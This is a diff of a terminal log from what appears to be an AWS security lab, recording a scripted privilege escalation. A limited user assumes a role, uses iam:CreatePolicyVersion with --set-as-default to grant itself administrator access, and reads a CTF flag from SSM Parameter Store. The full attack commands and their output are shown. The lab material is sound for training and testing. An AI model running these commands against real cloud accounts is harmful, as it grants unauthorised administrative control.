@@ -26,7 +26,7 @@ Role ARN: arn:aws:iam::123456789012:role/pl-prod-iam-001-to-admin-starting-role
 [1;33mStep 4: Testing current permissions[0m
 Attempting to list IAM users (should fail)...
 [2m[Attacker] $ aws iam list-users --max-items 1[0m
-[1;33m⚠ Warning: Unexpected permissions[0m
+[0;32m✓ Confirmed limited permissions[0m
 
 [1;33mStep 5: Escalating privileges via iam:CreatePolicyVersion[0m
 Creating new policy version with admin permissions...
@@ -45,9 +45,9 @@ New policy version content:
 [0;36m[Attacker] $ aws iam create-policy-version --policy-arn "arn:aws:iam::123456789012:policy/pl-prod-iam-001-to-admin-policy" --policy-document file:///tmp/admin-policy-version.json --set-as-default[0m
 {
     "PolicyVersion": {
-        "VersionId": "v6",
+        "VersionId": "v2",
         "IsDefaultVersion": true,
-        "CreateDate": "2026-04-09T23:54:15Z"
+        "CreateDate": "2026-05-06T02:47:02Z"
     }
 }
 [0;32m✓ Successfully created new policy version with admin permissions![0m
@@ -63,30 +63,42 @@ Testing S3 access...
 [2m[ReadOnly] $ aws s3 ls[0m
 2026-02-04 10:27:37 dd-chaos-cloud-697683661464-us-east-1
 2026-02-04 10:04:55 dd-terraform-dev-pathfinding-labs-prod
+2026-04-17 05:04:32 pl-cfn-002-admin-bucket-697683661464-66pzel
+2026-04-17 05:04:32 pl-cfn-005-admin-bucket-697683661464-66pzel
 2026-04-09 15:02:58 pl-prod-8min-rag-data-697683661464-66pzel
-2026-04-03 12:18:28 pl-prod-iam-002-to-bucket-697683661464-66pzel
-2026-04-03 12:38:02 pl-prod-sts-001-to-bucket-697683661464-66pzel
 [0;32m✓ Confirmed administrator access![0m
 
-[0;32m========================================[0m
-[0;32mAttack Summary[0m
-[0;32m========================================[0m
-Starting Point: User [1;33mpl-prod-iam-001-to-admin-starting-user[0m
-Step 1: Assumed role [1;33mpl-prod-iam-001-to-admin-starting-role[0m
-Step 2: Used [1;33miam:CreatePolicyVersion[0m to create admin policy version
-Result: [0;32mAdministrator Access[0m
+[1;33mStep 7: Capturing CTF flag from SSM Parameter Store[0m
 
-[1;33mAttack Path:[0m
-  pl-prod-iam-001-to-admin-starting-user → (AssumeRole) → pl-prod-iam-001-to-admin-starting-role → (CreatePolicyVersion) → Admin
-
-[1;33mAttack Commands:[0m
-  [0;36m$ aws iam create-policy-version --policy-arn "arn:aws:iam::123456789012:policy/pl-prod-iam-001-to-admin-policy" --policy-document file:///tmp/admin-policy-version.json --set-as-default[0m
-
-[0;31mIMPORTANT: Run cleanup_attack.sh to remove the malicious policy version[0m
+[0;36m[Attacker (now admin)] $ aws ssm get-parameter --name /pathfinding-labs/flags/iam-001-to-admin --query 'Parameter.Value' --output text[0m
+[0;32m✓ Flag captured: flag{iam_001_policy_version_self_escalated}[0m
 
 [1;33m[demo_permissions] Restoring helpful permissions...[0m
   Restored user: pl-prod-iam-001-to-admin-starting-user
 [0;32m[demo_permissions] Helpful permissions restored[0m
+
+[0;32m========================================[0m
+[0;32mCTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+1. Started as: pl-prod-iam-001-to-admin-starting-user (limited permissions)
+2. Assumed role: pl-prod-iam-001-to-admin-starting-role
+3. Used iam:CreatePolicyVersion (self) to apply admin policy version
+4. Achieved: Administrator Access
+5. Captured CTF flag from SSM Parameter Store: flag{iam_001_policy_version_self_escalated}
+
+[1;33mAttack Path:[0m
+  pl-prod-iam-001-to-admin-starting-user → (sts:AssumeRole)
+  → pl-prod-iam-001-to-admin-starting-role → (iam:CreatePolicyVersion on self)
+  → Admin Access → (ssm:GetParameter) → CTF Flag
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws iam create-policy-version --policy-arn "arn:aws:iam::123456789012:policy/pl-prod-iam-001-to-admin-policy" --policy-document file:///tmp/admin-policy-version.json --set-as-default[0m
+  [0;36m$ aws ssm get-parameter --name /pathfinding-labs/flags/iam-001-to-admin --query 'Parameter.Value' --output text[0m
+
+[0;31mIMPORTANT: Run cleanup_attack.sh to remove the malicious policy version[0m
+
 
 [Errno 32] Broken pipe
 Exception ignored in: <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>
